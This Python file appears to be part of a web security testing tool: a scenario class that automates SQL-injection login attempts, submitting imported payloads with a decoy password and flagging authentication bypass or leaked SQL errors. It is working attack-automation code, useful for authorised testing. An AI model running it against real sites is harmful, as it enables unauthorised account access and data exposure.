"""SQL-injection authentication-bypass scenario.

Flow:
    [ACTION] open + navigate to the login form
    [ATTACK] submit a SQLi payload as the username (with a throwaway password)
    [OBSERVE]/[SIGNAL] did we land in an authenticated area, or leak a SQL error?

Wins:
    * auth bypass  - the response shows a logged-in marker despite bad creds
    * error-based  - the response leaks a SQL-engine error (injection proven)
"""

from __future__ import annotations

from typing import List

from core.models import Observation, Payload
from core.payloads import SQLI_PAYLOADS, SQL_ERROR_FINGERPRINTS
from .base import Scenario


class SqliLoginScenario(Scenario):
    kind = "sqli-login"

    DEFAULTS = dict(
        login_path="/",
        login_action="/login",
        user_selector="input[name=username]",
        pass_selector="input[name=password]",
        submit_selector="button[type=submit]",
        decoy_password="x",
        success_markers=["logout", "welcome", "dashboard", "sign out"],
        component="login form (username)",
        name="sqli auth-bypass on /login",
    )

    def __init__(self, base_url: str, **params):
        merged = {**self.DEFAULTS, **params}
        super().__init__(base_url, **merged)

    def signal_description(self) -> str:
        return ("login succeeds without valid credentials, or the response "
                "leaks a SQL-engine error")

    def preflight(self, driver, console) -> None:
        console.action(f"Target login form: {self.url(self.params['login_path'])}")

    def candidate_payloads(self) -> List[Payload]:
        return list(SQLI_PAYLOADS)

    def attempt(self, driver, console, payload: Payload) -> Observation:
        login_url = self.url(self.params["login_path"])
        console.input_(
            f"Username <- '{payload.short()}'  |  password <- '{self.params['decoy_password']}'"
        )
        console.attack(f"Submitting SQLi '{payload.name}': {payload.short()}")
        res = driver.login(
            login_url,
            self.params["user_selector"], payload.value,
            self.params["pass_selector"], self.params["decoy_password"],
            submit=self.params["submit_selector"],
            action_url=self.url(self.params["login_action"]),
        )

        if res.error:
            return Observation(ok=False, error=res.error, evidence={"status": res.status})

        html_l = (res.html or "").lower()

        # error-based injection --------------------------------------------
        leaked = next((fp for fp in SQL_ERROR_FINGERPRINTS if fp in html_l), None)
        if leaked:
            detail = f"SQL error leaked in response (fingerprint: '{leaked}') -> injectable"
            console.signal(detail)
            return Observation(ok=True, signal=True, signal_detail=detail,
                               evidence={"status": res.status, "sql_error": leaked,
                                         "landed_url": res.url})

        # auth bypass ------------------------------------------------------
        marker = next((m for m in self.params["success_markers"] if m in html_l), None)
        if marker:
            detail = f"Authenticated area reached without valid creds (marker: '{marker}')"
            console.signal(detail)
            return Observation(ok=True, signal=True, signal_detail=detail,
                               evidence={"status": res.status, "marker": marker,
                                         "landed_url": res.url})

        console.observe("Login rejected; no SQL error, no bypass.")
        return Observation(ok=True, signal=False,
                           evidence={"status": res.status, "landed_url": res.url})
